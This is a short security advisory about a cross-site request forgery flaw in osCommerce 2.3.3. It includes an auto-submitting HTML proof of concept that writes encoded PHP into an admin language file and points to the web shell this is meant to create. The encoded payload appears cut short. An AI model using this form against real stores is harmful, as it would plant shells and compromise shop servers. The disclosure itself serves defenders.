osCommerce is prone to a cross-site request-forgery vulnerability because the application fails to properly validate HTTP requests.

Exploiting this issue may allow a remote attacker to perform certain actions in the context of an authorized user's session and gain unauthorized access to the affected application; other attacks are also possible.

osCommerce 2.3.3 is vulnerable; other versions may also be affected.

The following example data is available:

<html><body onload="document.runCSRF.submit();">
<form method="post" name="runCSRF"
action="http://www.example.com/catalog/admin/define_language.php?lngdir=english&filename=english/download.php&action=save">
<input type="hidden" name="file_contents"
value="&#x3c;&#x3f;&#x70;&#x68;&#x70;&#x20;&#x24;&#x63;&#x6d;&#x64;">
</form>your shell should be here:
catalog/includes/languages/english/download.php?cmd=id<br></body></html>
